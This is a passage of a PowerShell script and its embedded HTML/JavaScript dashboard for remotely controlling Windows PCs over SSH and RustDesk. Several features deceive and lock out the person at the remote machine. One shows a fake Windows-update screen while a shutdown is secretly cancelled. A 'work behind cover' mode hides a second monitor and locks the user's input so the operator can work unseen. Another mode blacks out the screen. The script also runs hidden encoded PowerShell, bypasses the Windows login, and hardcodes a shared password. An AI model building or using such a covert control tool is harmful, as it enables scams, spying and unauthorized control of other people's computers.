            $launcher = "Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile','-EncodedCommand','$(Enc $inner)'"
            SSH-Run $ip ("powershell -NoProfile -EncodedCommand $(Enc $launcher)") | Out-Null
            return "Upgrade started."
        }
        'terminal' { $u = Login-For $ip; Start-Process cmd "/k ssh -l $u $ip"; return "Opened terminal window." }
        'privacy'  {
            $rd = @('C:\Program Files\RustDesk\rustdesk.exe','C:\Program Files (x86)\RustDesk\rustdesk.exe') | Where-Object { Test-Path $_ } | Select-Object -First 1
            if (-not $rd) { return "Install RustDesk on THIS PC first (rustdesk.com)." }
            Start-Process $rd "--connect $ip"
            return "RustDesk opening. In its top toolbar click the SHIELD (Privacy Mode) - the client's monitor goes black + locked, while you keep working. Password if asked: Support@2026!"
        }
        'screen'   {
            $rd = @('C:\Program Files\RustDesk\rustdesk.exe','C:\Program Files (x86)\RustDesk\rustdesk.exe') | Where-Object { Test-Path $_ } | Select-Object -First 1
            if (-not $rd) { return "Install RustDesk on THIS PC first (get it free at rustdesk.com - no account needed)." }
            Start-Process $rd "--connect $ip"
            return "Opening RustDesk to $ip. If it asks for a password, type: Support@2026!  (If nothing opens, type $ip into RustDesk's box and Connect.)"
        }
        'restart'  { SSH-Fire $ip 'shutdown /r /t 0 /f' 2; return "Restart sent." }
        'shutdown' { SSH-Fire $ip 'shutdown /s /t 0 /f' 2; return "Shutdown sent." }
        'stoprestart' {
            # "Fake shutdown -> restart in 5 min". Time-critical, so everything is
            # fire-and-forget (never wait for an SSH reply).
            #  1) cancel the running shutdown AND schedule a restart 5 min later, in ONE
            #     remote command so the order is guaranteed (/a before /r). Sent twice.
            #  2) instantly flip the client to the blue Windows-update cover (LOCK_MODE=blue)
            #     and drop LOCK.flag in the SAME shot, so the update screen shows within a
            #     couple of seconds while the shutdown is cancelled underneath.
            #  3) keep that cover fresh (heartbeat) only until just before the restart,
            #     then stop, so the PC reboots clean.
            $u = Login-For $ip
            $sshOpts = @('-o','StrictHostKeyChecking=no','-o','BatchMode=yes','-o','ConnectTimeout=4')
            $rc = 'shutdown /a & shutdown /r /t 300 /f'
            1..2 | ForEach-Object {
                Start-Process ssh -WindowStyle Hidden -ArgumentList ($sshOpts + @("$u@$ip", $rc)) -ErrorAction SilentlyContinue
            }
            $coverPs = @'
$f='C:\ProgramData\RemoteSupport\config.txt'
$d=Split-Path $f; if(-not(Test-Path $d)){New-Item -ItemType Directory -Path $d -Force|Out-Null}
$k=@(); if(Test-Path $f){$k=@(Get-Content $f | Where-Object {$_ -notmatch '^LOCK_MODE=' -and $_.Trim() -ne ''})}
$k+='LOCK_MODE=blue'
Set-Content -Path $f -Value $k -Encoding ascii
Set-Content -Path 'C:\ProgramData\RemoteSupport\LOCK.flag' -Value '' -Encoding ascii
'@
            Start-Process ssh -WindowStyle Hidden -ArgumentList ($sshOpts + @("$u@$ip", ('powershell -NoProfile -EncodedCommand ' + (Enc $coverPs)))) -ErrorAction SilentlyContinue
            $script:lockedClients[$ip] = $true
            $script:deadUntil[$ip] = (Get-Date).AddSeconds(320)
            return "Done - shutdown cancelled, blue Windows-update screen showing, PC restarts in ~5 min."
        }
        'health'   { return (SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $reportPs))) }
        'who'      { return (SSH-Run $ip 'query user') }
        'lock'     { SSH-Fire $ip 'cmd /c echo.> C:\ProgramData\RemoteSupport\LOCK.flag'; $script:lockedClients[$ip]=$true; Save-LockState; return "Lock sent - client screen is locking." }
        'unlock'   { SSH-Fire $ip 'cmd /c del /f /q C:\ProgramData\RemoteSupport\LOCK.flag'; $script:lockedClients.Remove($ip); Save-LockState; return "Unlock sent - client screen released." }
        default    { return "Unknown action." }
    }
}

$html = @'
<!DOCTYPE html><html><head><meta charset="utf-8"><title>My Remote Dashboard</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:"Segoe UI",Roboto,Arial,sans-serif}
body{background:#eef1f5;color:#2a2f3a;display:flex;height:100vh;overflow:hidden;font-size:13px}
#groups{width:212px;background:#fff;border-right:1px solid #e2e6ee;display:flex;flex-direction:column;flex:none}
.gh{padding:14px 16px;border-bottom:1px solid #eef1f5}
.gh h1{font-size:15px;font-weight:700;color:#1f2a3a}
.gbtn{display:block;width:calc(100% - 24px);margin:10px 12px 0;padding:9px;border:0;border-radius:6px;background:#2f6fed;color:#fff;font-size:13px;font-weight:600;cursor:pointer}
.gbtn:hover{background:#255fd0}
.gtools{display:flex;flex-wrap:wrap;gap:6px;padding:10px 12px;border-bottom:1px solid #eef1f5}
.tbtn{font-size:11.5px;color:#5a6472;background:#f2f5fa;border:1px solid #dfe4ee;padding:5px 9px;border-radius:6px;cursor:pointer}
.tbtn:hover{background:#e7edf7}
.grouplist{flex:1;overflow:auto;padding:6px 0}
.glabel{padding:8px 16px 4px;font-size:11px;text-transform:uppercase;letter-spacing:.4px;color:#98a1b1}
.grp{display:flex;justify-content:space-between;align-items:center;padding:8px 16px;font-size:13px;color:#2a2f3a;cursor:pointer}
.grp:hover{background:#f2f5fa}
.grp.act{background:#e8effd;color:#2f6fed;font-weight:600;border-left:3px solid #2f6fed;padding-left:13px}
.grp .n{color:#98a1b1;font-size:12px}
#center{flex:1;display:flex;flex-direction:column;min-width:0;background:#fff;border-right:1px solid #e2e6ee}
.chead{padding:12px 18px;border-bottom:1px solid #eef1f5;display:flex;align-items:center;gap:12px}
.chead h2{font-size:15px;font-weight:600;color:#1f2a3a}
.chead .cnt{font-size:12px;color:#8a93a3}
.grow{flex:1}
#search{padding:7px 11px;border:1px solid #dfe4ee;border-radius:7px;background:#f7f9fc;font-size:13px;width:210px}
#list{flex:1;overflow:auto}
.row{display:flex;align-items:center;gap:12px;padding:10px 18px;cursor:pointer;border-bottom:1px solid #eef1f5}
.row:hover{background:#f5f8fd}
.row.sel{background:#e8effd}
.dot{width:9px;height:9px;border-radius:50%;flex:none}
.on{background:#46b556}.off{background:#c2c9d4}
.lthumb{width:66px;height:39px;border-radius:5px;background:#0a0d16;border:1px solid #d7dde6;overflow:hidden;position:relative;flex:none}
.lthumb img{width:100%;height:100%;object-fit:cover;display:block}
.lthumb .ov{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:8px;color:#8a93a3;background:#0a0d16}
.spin{width:14px;height:14px;border:2px solid #3a4657;border-top-color:#9db6e6;border-radius:50%;animation:sp 1s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
.rmid{flex:1;min-width:0}
.rname{font-size:13.5px;color:#1f2a3a;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.rhost{font-size:11.5px;color:#8a93a3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.rstat{width:140px;flex:none}
.bar{height:6px;border-radius:4px;background:#e4e8ef;overflow:hidden;margin-bottom:4px}
.bar>i{display:block;height:100%;background:#46b556}
.rlast{font-size:11px;color:#8a93a3;text-align:right}
.mon{width:22px;flex:none;color:#9aa4b4;text-align:center;font-size:16px}
#right{width:342px;flex:none;display:flex;flex-direction:column;overflow:auto;background:#fafbfd}
#empty{flex:1;display:flex;align-items:center;justify-content:center;color:#98a1b1;font-size:14px;padding:20px;text-align:center}
.rtop{padding:16px 18px;border-bottom:1px solid #eef1f5}
.rtop .big{font-size:17px;font-weight:700;color:#1f2a3a}
.rtop .sub{font-size:12px;color:#8a93a3;margin-top:3px}
.badge{display:inline-block;margin-top:9px;font-size:11px;padding:3px 10px;border-radius:20px}
.badge.on{background:#e4f6e8;color:#2e8b40}.badge.off{background:#fdeaea;color:#c0504a}
.preview{position:relative;margin:14px 18px 4px;border:1px solid #d7dde6;border-radius:8px;overflow:hidden;height:0;padding-bottom:56.25%;background:#0a0d16}
.preview img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;display:block}
.preview .ov{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;gap:8px;font-size:12px;color:#8a93a3;background:#0a0d16}
.acts{padding:14px 18px;display:grid;grid-template-columns:1fr 1fr;gap:9px}
button.act{padding:11px;border-radius:7px;border:1px solid #dfe4ee;background:#f5f8fd;color:#2a2f3a;font-size:13px;cursor:pointer;text-align:left}
button.act:hover{background:#e9f0fb;border-color:#b9c8e6}
button.act.danger:hover{background:#fdeaea;border-color:#e6a8a2}
button.act.go{background:#2f6fed;border-color:#2f6fed;color:#fff}
button.act.go:hover{background:#255fd0}
#out{margin:0 18px 12px;padding:11px;background:#f2f5fa;border:1px solid #e2e6ee;border-radius:7px;font-family:Consolas,monospace;font-size:12px;color:#3a6b48;white-space:pre-wrap;min-height:36px;max-height:160px;overflow:auto}
.lockbox{margin:0 18px 18px;padding:14px;background:#fff;border:1px solid #e2e6ee;border-radius:9px}
.lockbox h3{font-size:13.5px;color:#1f2a3a;margin-bottom:10px}
.fld{margin-bottom:10px}
.fld label{display:block;font-size:12px;color:#6a7385;margin-bottom:5px}
.fld input[type=text],.fld input[type=url],.fld input[type=color]{width:100%;padding:8px 10px;border-radius:6px;border:1px solid #dfe4ee;background:#f7f9fc;color:#2a2f3a;font-size:13px}
.fld input[type=color]{width:52px;height:34px;padding:2px}
.savebtn{margin-top:4px;padding:9px 16px;border-radius:7px;border:1px solid #2f6fed;background:#2f6fed;color:#fff;font-size:13px;cursor:pointer}
.hint{font-size:11px;color:#98a1b1;margin-top:6px}
.rn{font-size:12px;color:#2f6fed;background:#fff;border:1px solid #cdd8ee;padding:5px 10px;border-radius:6px;cursor:pointer;margin-top:8px;margin-right:6px}
.rbtn{font-size:12px;color:#5a6472;background:#f2f5fa;border:1px solid #dfe4ee;padding:4px 9px;border-radius:6px;cursor:pointer}
/* ---- dark mode ---- */
body.dark{background:#0f1420;color:#e6eaf2}
body.dark #groups{background:#161d2e;border-color:#263148}
body.dark .gh{border-color:#22304a}body.dark .gh h1{color:#fff}
body.dark .gtools{border-color:#22304a}
body.dark .tbtn{background:#1a2236;border-color:#2c3752;color:#9fb0d0}
body.dark .tbtn:hover{background:#22304e}
body.dark .glabel{color:#7d8aa5}
body.dark .grp{color:#c7d1e2}body.dark .grp:hover{background:#1a2234}
body.dark .grp.act{background:#1e2b46;color:#9dc3ff;border-color:#4a7bd0}
body.dark .grp .n{color:#7d8aa5}
body.dark #center{background:#0f1420;border-color:#263148}
body.dark .chead{border-color:#22304a}body.dark .chead h2{color:#fff}body.dark .cnt{color:#7d8aa5}
body.dark #search{background:#0f1420;border-color:#2c3752;color:#e6eaf2}
body.dark .row{border-color:#1c2436}body.dark .row:hover{background:#161f33}body.dark .row.sel{background:#1e2b46}
body.dark .rname{color:#eef2f8}body.dark .rhost,body.dark .rlast{color:#7d8aa5}
body.dark .bar{background:#233049}
body.dark #right{background:#121a28}
body.dark .rtop{border-color:#22304a}body.dark .rtop .big{color:#fff}body.dark .rtop .sub{color:#7d8aa5}
body.dark button.act{background:#1a2236;border-color:#2c3752;color:#e6eaf2}
body.dark button.act:hover{background:#243050;border-color:#3a4a72}
body.dark button.act.go{background:#1c3a6b;border-color:#295596;color:#fff}
body.dark #out{background:#0c1120;border-color:#263148;color:#a9d6b6}
body.dark .lockbox{background:#141b2b;border-color:#263148}body.dark .lockbox h3{color:#dfe6f2}
body.dark .fld label{color:#8fa0c0}
body.dark .fld input[type=text],body.dark .fld input[type=url]{background:#0f1420;border-color:#2c3752;color:#e6eaf2}
body.dark .rn{background:#161d2e;border-color:#2c3752;color:#9dc3ff}
body.dark .hint{color:#6f7ea0}
</style></head><body>
<div id="groups">
  <div class="gh"><h1>My Remote</h1></div>
  <button class="gbtn" onclick="newClient()">+ New client</button>
  <div class="gtools">
    <button class="tbtn" onclick="load()">Refresh</button>
    <button class="tbtn" id="upBtn" onclick="upgradeAll()">Upgrade all</button>
    <button class="tbtn" id="lvBtn" onclick="toggleLive()">Live: ON</button>
    <button class="tbtn" id="dkBtn" onclick="toggleDark()">Dark: OFF</button>
  </div>
  <div class="grouplist">
    <div class="glabel">Session Groups</div>
    <div class="grp act" data-g="all" onclick="setGroup('all')"><span>All Machines</span><span class="n" id="cAll">0</span></div>
    <div class="grp" data-g="online" onclick="setGroup('online')"><span>Online</span><span class="n" id="cOn">0</span></div>
    <div class="grp" data-g="offline" onclick="setGroup('offline')"><span>Offline</span><span class="n" id="cOff">0</span></div>
  </div>
</div>
<div id="center">
  <div class="chead"><h2 id="grpTitle">All Machines</h2><span class="cnt" id="count"></span><div class="grow"></div><input id="search" placeholder="Search machines..." oninput="render()"></div>
  <div id="list"></div>
</div>
<div id="right"><div id="empty">Select a machine from the list</div></div>
<script>
let clients=[],sel=null,liveView=true,thumbBusy=false,previewUpdatedAt=0,onlineSince={};
function refreshPreview(){ updateThumbs(); }
function fmtDur(ms){var s=Math.floor(ms/1000);if(s<60)return s+'s';var m=Math.floor(s/60);if(m<60)return m+'m';var h=Math.floor(m/60);return h+'h '+(m%60)+'m';}
function tickLastUpd(){
  const el=document.getElementById('lastUpd');if(!el||!sel)return;
  if(sel.online){ const t=onlineSince[sel.ip]; el.textContent = t ? ('Online for '+fmtDur(Date.now()-t)) : 'Online'; }
  else { el.textContent='Last seen '+timeAgo(sel.lastSeen); }
}
function toggleLive(){
  liveView=!liveView;
  const b=document.getElementById('lvBtn');if(b)b.textContent='Live: '+(liveView?'ON':'OFF');
  render();
}
function toggleDark(){
  document.body.classList.toggle('dark');
  const on=document.body.classList.contains('dark');
  const b=document.getElementById('dkBtn');if(b)b.textContent='Dark: '+(on?'ON':'OFF');
  try{localStorage.setItem('dashDark',on?'1':'0');}catch(e){}
}
try{ if(localStorage.getItem('dashDark')==='1'){ document.body.classList.add('dark'); const db=document.getElementById('dkBtn'); if(db)db.textContent='Dark: ON'; } }catch(e){}
async function updateThumbs(){
  if(!liveView||thumbBusy)return;
  thumbBusy=true;
  try{
    const imgs=[...document.querySelectorAll('img.thumb')];
    for(const im of imgs){
      const ip=im.dataset.ip;if(!ip)continue;
      try{const r=await fetch('/api/thumb?ip='+ip,{cache:'no-store'});const j=await r.json();
        if(j.img&&j.img.length>100){
          im.src='data:image/jpeg;base64,'+j.img;
          document.querySelectorAll('.ov[data-ov="'+ip+'"]').forEach(o=>o.style.display='none');
          if(sel&&ip===sel.ip)previewUpdatedAt=Date.now();
        }}catch(e){}
    }
  }finally{thumbBusy=false;}
}
async function load(){try{const r=await fetch('/api/clients');clients=await r.json();}catch(e){}render();syncBadge();}
let curGroup='all';
function setGroup(g){
  curGroup=g;
  document.querySelectorAll('.grp').forEach(x=>x.classList.toggle('act',x.dataset.g===g));
  document.getElementById('grpTitle').textContent=g==='online'?'Online':(g==='offline'?'Offline':'All Machines');
  render();
}
function render(){
  const q=(document.getElementById('search').value||'').toLowerCase();
  const on=clients.filter(c=>c.online).length;
  document.getElementById('cAll').textContent=clients.length;
  document.getElementById('cOn').textContent=on;
  document.getElementById('cOff').textContent=clients.length-on;
  clients.forEach(c=>{ if(c.online){ if(!onlineSince[c.ip]) onlineSince[c.ip]=Date.now(); } else { delete onlineSince[c.ip]; } });
  let arr=clients.filter(c=>(c.name+c.host+c.ip).toLowerCase().includes(q));
  if(curGroup==='online')arr=arr.filter(c=>c.online);
  if(curGroup==='offline')arr=arr.filter(c=>!c.online);
  document.getElementById('count').textContent=arr.length+' machines';
  const list=document.getElementById('list');list.innerHTML='';
  arr.forEach(c=>{
    const d=document.createElement('div');d.className='row'+(sel&&sel.ip===c.ip?' sel':'');
    const stat=c.online?'<div class="bar"><i style="width:100%"></i></div><div class="rlast">online now</div>'
                       :'<div class="bar"><i style="width:0"></i></div><div class="rlast">last seen '+timeAgo(c.lastSeen)+'</div>';
    d.innerHTML='<span class="dot '+(c.online?'on':'off')+'"></span>'+
      '<div class="rmid"><div class="rname">'+esc(c.name)+'</div><div class="rhost">'+esc(c.host)+(c.online?' - '+c.ip:'')+'</div></div>'+
      '<div class="rstat">'+stat+'</div><div class="mon">&#128421;</div>';
    d.onclick=()=>{sel=c;render();panel();};list.appendChild(d);
  });
}
function syncBadge(){
  if(!sel)return;const c=clients.find(x=>x.ip===sel.ip);if(!c)return;sel.online=c.online;sel.lastSeen=c.lastSeen;
  const b=document.getElementById('badge');if(b){b.className='badge '+(c.online?'on':'off');b.textContent=c.online?'Online':'Offline';}
}
function panel(){
  const r=document.getElementById('right');if(!sel){r.innerHTML='<div id="empty">Select a client</div>';return;}
  previewUpdatedAt=0;
  r.innerHTML=`
   <div class="rtop"><div><div class="big">${esc(sel.name)}</div><div class="sub">${esc(sel.host)} - ${sel.ip}${sel.online?'':' - last seen '+timeAgo(sel.lastSeen)}</div></div>
     <span id="badge" class="badge ${sel.online?'on':'off'}">${sel.online?'Online':'Offline'}</span>
     <button class="rn" id="copyIpBtn" onclick="copyIp('${sel.ip}')" title="Copy this client's Tailscale IP for RustDesk">Copy IP</button>
     <button class="rn" onclick="rename()">Rename</button></div>
   ${sel.online?('<div class="preview"><div class="ov" data-ov="'+sel.ip+'"><div class="spin"></div>Connecting to '+esc(sel.name)+'...</div>'+(liveView?'<img class="thumb" data-ip="'+sel.ip+'">':'<div class="ov">Live view is OFF</div>')+'</div>'+
     '<div style="margin:7px 18px 0;display:flex;align-items:center;justify-content:space-between;font-size:11px;color:#8a93a3"><span id="lastUpd">...</span><button class="rn" style="margin:0;padding:3px 10px" onclick="refreshPreview()">Update now</button></div>'):''}
   <div class="acts">
     ${btn('screen','Open screen','go')}
     ${btn('terminal','Terminal','')}
     ${btn('health','Health / specs','')}
     ${btn('who','Who is logged in','')}
     <button class="act" onclick="autoLogin()">Auto-login (no password)</button>
     <button class="act" onclick="appMgr()">Block apps</button>
     ${btn('restart','Restart','danger')}
     ${btn('shutdown','Shutdown','danger')}
     <button class="act" onclick="stopRestart()" title="If the client is shutting down: cancel it, show the blue Windows-update screen, then auto-restart in 5 min">Stop shutdown &rarr; update screen + restart 5 min</button>
   </div>
   <div id="out">Ready.</div>
   <div class="lockbox" style="border-color:#3a4a72">
     <h3>Work behind cover (you work while client sees a cover)</h3>
     <div style="font-size:11px;color:#7d8aa5;margin:-6px 0 12px">Adds a hidden 2nd screen. Client's real screen shows black/update + their mouse/keyboard locked; you connect with RustDesk/AnyDesk, switch to monitor 2, and work normally.</div>
     <div style="display:flex;gap:14px;flex-wrap:wrap;align-items:center">
       <button type="button" id="wcUpdate" onclick="workCover('update')" style="padding:8px 18px;border-radius:7px;border:1px solid #2a6bb0;background:#0067b8;color:#fff;font-size:12.5px;cursor:pointer">Update ON</button>
       <button type="button" id="wcOff" onclick="workCover('off')" style="padding:8px 18px;border-radius:7px;border:1px solid #7a3a42;background:#3a2226;color:#e0868f;font-size:12.5px;cursor:pointer">OFF</button>
       <span id="wcBadge" style="margin-left:4px;font-size:12px;padding:5px 12px;border-radius:20px;background:#2b3550;color:#9fb0d0">Off</span>
     </div>
     <div class="hint">Turning OFF also removes the 2nd screen. Backup on the client: Ctrl+Alt+U. Closing this dashboard turns every cover off.</div>
   </div>`;
  checkWork();
}
function btn(a,label,cls){return `<button class="act ${cls}" onclick="act('${a}')">${label}</button>`;}
async function act(a){
  const o=document.getElementById('out');
  if(a==='lock'){showProg(0,1,'Locking '+sel.name+' screen...');}
  else if(a==='unlock'){showProg(0,1,'Unlocking '+sel.name+'...');}
  else if(o)o.textContent='Working...';
  try{const r=await fetch('/api/action',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:sel.ip,action:a})});
  const j=await r.json();
  if(a==='lock'){updProg(1,1,'Locked - client screen is showing the update screen.');setTimeout(hideProg,2500);setTimeout(checkLock,1500);}
  else if(a==='unlock'){updProg(1,1,'Unlocked - client screen released.');setTimeout(hideProg,2500);setTimeout(checkLock,1500);}
  if(o)o.textContent=j.output||'(no output)';}catch(e){hideProg();if(o)o.textContent='Error: '+e;}
}
function stopRestart(){
  if(!sel)return;
  const o=document.getElementById('out');
  if(o)o.textContent='Fired to '+sel.name+': shutdown cancelled, blue update screen showing, auto-restart in ~5 min.';
  fetch('/api/action',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:sel.ip,action:'stoprestart'})}).catch(()=>{});
}
async function checkLock(){
  const el=document.getElementById('lockStatus');if(!el||!sel)return;
  try{const r=await fetch('/api/lockmodeget?ip='+sel.ip);const j=await r.json();const s=j.status;
  paintMode(j.active||'off');
  if(s==='locked'){el.style.background='#123a22';el.style.color='#5fe08a';el.textContent='LOCKED - update screen is showing on the client';}
  else if(s==='unlocked'){el.style.background='#33262a';el.style.color='#e0868f';el.textContent='Not locked - client screen is normal';}
  else{el.style.background='#2a2410';el.style.color='#e0c06a';el.textContent='Could not check (client unreachable) - trying again...';}}catch(e){el.textContent='Status unknown';}
}
async function loadLock(){
  checkLock();
  try{const r=await fetch('/api/lockget?ip='+sel.ip);const j=await r.json();
  if(j.text)document.getElementById('lktext').value=j.text;
  if(j.color)document.getElementById('lkcolor').value=j.color;
  if(j.image)document.getElementById('lkimg').value=j.image;}catch(e){}
}
async function saveLock(){
  showProg(0,1,'Saving settings to '+sel.name+'...');
  const body={ip:sel.ip,text:document.getElementById('lktext').value,color:document.getElementById('lkcolor').value,image:document.getElementById('lkimg').value};
  try{const r=await fetch('/api/lockset',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
  await r.json();updProg(1,1,'Saved. Now press "Lock screen".');setTimeout(hideProg,2500);}catch(e){hideProg();alert('Error: '+e);}
}
function copyIp(ip){
  const b=document.getElementById('copyIpBtn');
  const done=()=>{ if(b){ b.textContent='Copied '+ip; setTimeout(()=>{b.textContent='Copy IP';},1800); } };
  try{ navigator.clipboard.writeText(ip).then(done,()=>fallbackCopy(ip,done)); }catch(e){ fallbackCopy(ip,done); }
}
function fallbackCopy(t,cb){
  const ta=document.createElement('textarea');ta.value=t;ta.style.position='fixed';ta.style.opacity='0';
  document.body.appendChild(ta);ta.focus();ta.select();
  try{document.execCommand('copy');}catch(e){}
  document.body.removeChild(ta);if(cb)cb();
}
async function rename(){
  const n=prompt('New name for this client:',sel.name);if(!n)return;
  await fetch('/api/rename',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:sel.host,ip:sel.ip,name:n})});
  sel.name=n;await load();panel();
}
async function upgradeAll(){
  if(!confirm('Push the latest update to ALL online clients now?'))return;
  const online=clients.filter(c=>c.online);
  showProg(0,online.length,'Starting...');
  let done=0;
  for(const c of online){
    updProg(done,online.length,'Upgrading '+c.name+' ...');
    try{await fetch('/api/action',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:c.ip,action:'upgrade'})});}catch(e){}
    done++; updProg(done,online.length,'Upgrading '+c.name+' ...');
  }
  updProg(online.length,online.length,'Done - '+online.length+' upgraded. Offline clients auto-update within 30 min.');
  setTimeout(hideProg,4000); load();
}
function showProg(d,t,msg){let o=document.getElementById('progWrap');if(!o){o=document.createElement('div');o.id='progWrap';o.style.cssText='position:fixed;left:50%;top:20px;transform:translateX(-50%);width:420px;max-width:90%;background:#161d2e;border:1px solid #295596;border-radius:10px;padding:14px 16px;z-index:9999;box-shadow:0 8px 30px rgba(0,0,0,.5)';o.innerHTML='<div id="progMsg" style="font-size:13px;color:#dfe6f2;margin-bottom:10px">'+msg+'</div><div style="height:10px;background:#0f1420;border-radius:6px;overflow:hidden"><div id="progBar" style="height:100%;width:0%;background:#3b82f6;transition:width .3s"></div></div><div id="progPct" style="font-size:11px;color:#8fa0c0;margin-top:6px;text-align:right">0%</div>';document.body.appendChild(o);}updProg(d,t,msg);}
function updProg(d,t,msg){const bar=document.getElementById('progBar');const pm=document.getElementById('progMsg');const pp=document.getElementById('progPct');if(!bar)return;const pct=t?Math.round(d/t*100):100;bar.style.width=pct+'%';if(pm&&msg)pm.textContent=msg;if(pp)pp.textContent=pct+'% ('+d+'/'+t+')';}
function hideProg(){const o=document.getElementById('progWrap');if(o)o.remove();}
async function newClient(){
  let link='';try{const r=await fetch('/api/setuplink');link=(await r.json()).link;}catch(e){}
  if(!link||link.indexOf('PASTE_')===0){alert('No setup link is set yet. Add your cloud link in dashboard.ps1 ($setupLink).');return;}
  let o=document.getElementById('ncWrap');if(o)o.remove();
  o=document.createElement('div');o.id='ncWrap';
  o.style.cssText='position:fixed;left:50%;top:80px;transform:translateX(-50%);width:520px;max-width:92%;background:#161d2e;border:1px solid #2e7d46;border-radius:12px;padding:18px;z-index:9999;box-shadow:0 10px 40px rgba(0,0,0,.6)';
  o.innerHTML='<div style="font-size:14px;color:#eef2f8;font-weight:600;margin-bottom:6px">Add a new client</div>'+
    '<div style="font-size:12px;color:#8fa0c0;margin-bottom:12px">Paste this link into the new PC\'s browser. It downloads the setup file. Then run it once.</div>'+
    '<input id="ncLink" readonly value="'+link.replace(/"/g,'&quot;')+'" style="width:100%;padding:10px;border-radius:6px;border:1px solid #2c3752;background:#0f1420;color:#e6eaf2;font-size:12.5px;margin-bottom:12px">'+
    '<button id="ncCopy" style="padding:9px 16px;border-radius:7px;border:1px solid #2e7d46;background:#173d26;color:#8fe0a8;font-size:13px;cursor:pointer">Copy link</button>'+
    '<button onclick="document.getElementById(\'ncWrap\').remove()" style="padding:9px 16px;border-radius:7px;border:1px solid #2c3752;background:none;color:#9fb0d0;font-size:13px;cursor:pointer;margin-left:8px">Close</button>';
  document.body.appendChild(o);
  const inp=document.getElementById('ncLink');inp.focus();inp.select();
  document.getElementById('ncCopy').onclick=()=>{inp.select();try{navigator.clipboard.writeText(link);}catch(e){document.execCommand('copy');}document.getElementById('ncCopy').textContent='Copied!';};
}
async function autoLogin(){
  const p=prompt("Enter the CURRENT Windows password for this PC's user (the one you last set).\n\nLeave empty if the account has no password.\n\nThis makes the PC skip the login screen from now on.");
  if(p===null)return;
  const o=document.getElementById('out');if(o)o.textContent='Setting up auto-login...';
  try{const r=await fetch('/api/autologin',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:sel.ip,pass:p})});const j=await r.json();if(o)o.textContent=j.output||'Done';}catch(e){if(o)o.textContent='Error: '+e;}
}
let appCache={};
async function appMgr(force){
  const ip=sel.ip;
  if(!force && appCache[ip]){showAppModal(appCache[ip].apps,new Set(appCache[ip].blocked),new Set(appCache[ip].prot),sel.name,ip);return;}
  const o=document.getElementById('out');if(o)o.textContent='Scanning apps on '+sel.name+' ...';
  let apps=[],blocked=[],prot=[],bmsg='',failed=false;
  try{const r=await fetch('/api/appscan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,force:!!force})});const j=await r.json();
    apps=JSON.parse(j.apps||'[]');blocked=JSON.parse(j.blocked||'[]');prot=(j.protected||'').split(',');bmsg=j.blockmsg||'';failed=!!j.failed;}catch(e){if(o)o.textContent='Scan failed: '+e;alert('Scan failed - no response from '+sel.name+'. Check the client is online and try Rescan.');return;}
  if(!Array.isArray(apps))apps=apps?[apps]:[];
  if(!Array.isArray(blocked))blocked=blocked?[blocked]:[];
  blocked=blocked.map(x=>(''+x).toLowerCase());prot=prot.map(x=>(''+x).toLowerCase());
  appCache[ip]={apps,blocked,prot,msg:bmsg};
  if(failed){if(o)o.textContent='Scan timed out - showing what we could get.';}
  else if(o)o.textContent='Ready.';
  showAppModal(apps,new Set(blocked),new Set(prot),sel.name,ip,failed);
}
function appRow(name,exe,blocked,prot,uninst){
  let right;
  if(prot) right='<span style="font-size:11px;color:#6f7ea0;border:1px solid #2c3752;border-radius:6px;padding:6px 10px">Protected</span>';
  else if(blocked) right='<button onclick="appToggle(this,\''+exe+'\',false)" style="padding:6px 12px;border-radius:6px;border:1px solid #2e7d46;background:#173d26;color:#8fe0a8;cursor:pointer;font-size:12px">Blocked \u2713 unblock</button>';
  else right='<button onclick="appToggle(this,\''+exe+'\',true)" style="padding:6px 12px;border-radius:6px;border:1px solid #7a3a42;background:#241a1d;color:#e0868f;cursor:pointer;font-size:12px">Block</button>';
  let un='';
  if(!prot && uninst){un='<button onclick="appUninstall(this,\''+exe+'\')" style="padding:6px 12px;border-radius:6px;border:1px solid #7a5a2e;background:#2a2016;color:#e0b86f;cursor:pointer;font-size:12px;margin-left:6px">Uninstall</button>';}
  return '<div class="appRow" data-exe="'+exe+'" data-name="'+(name||'').toLowerCase()+'" style="display:flex;align-items:center;gap:10px;padding:8px 6px;border-bottom:1px solid #1d2537;'+(blocked?'background:#1c1417;':'')+'">'+
    '<div style="flex:1"><div class="appName" style="font-size:13px;color:#eef2f8">'+esc(name)+'</div><div style="font-size:11px;color:#7d8aa5">'+esc(exe)+'</div></div>'+right+un+'</div>';
}
function showAppModal(apps,bset,pset,cname,ip,failed){
  let o=document.getElementById('appWrap');if(o)o.remove();
  o=document.createElement('div');o.id='appWrap';o.dataset.ip=ip;
  o.style.cssText='position:fixed;left:50%;top:40px;transform:translateX(-50%);width:580px;max-width:94%;max-height:82vh;overflow:auto;background:#161d2e;border:1px solid #395182;border-radius:12px;padding:18px;z-index:9999;box-shadow:0 10px 40px rgba(0,0,0,.6)';
  const appMap=new Map(apps.map(a=>[(a.exe||'').toLowerCase(),a]));
  const bl=[...bset].map(exe=>appMap.get(exe)||{name:exe,exe:exe});
  const rest=apps.filter(a=>!bset.has((a.exe||'').toLowerCase()));
  let head='';
  if(bl.length){head='<div style="font-size:12px;color:#e0868f;font-weight:600;margin:4px 0 6px">Blocked ('+bl.length+')</div>'+bl.map(a=>appRow(a.name,(a.exe||'').toLowerCase(),true,false,a.un===1)).join('')+'<div style="font-size:12px;color:#8fa0c0;font-weight:600;margin:14px 0 6px">All apps</div>';}
  let rows=rest.map(a=>{const ex=(a.exe||'').toLowerCase();return appRow(a.name,ex,false,pset.has(ex),a.un===1);}).join('');
